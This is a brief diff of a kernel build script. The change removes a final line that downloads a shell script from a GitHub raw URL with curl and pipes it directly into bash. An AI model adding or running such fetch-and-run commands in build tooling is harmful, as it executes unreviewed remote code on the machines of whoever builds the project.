@@ -292,5 +292,3 @@ pack_anykernel
 show_build_time
 
 cd "$kernel_dir"
-
-curl -sf https://raw.githubusercontent.com/xc112lg/testonly/refs/heads/main/testevo.sh  | bash
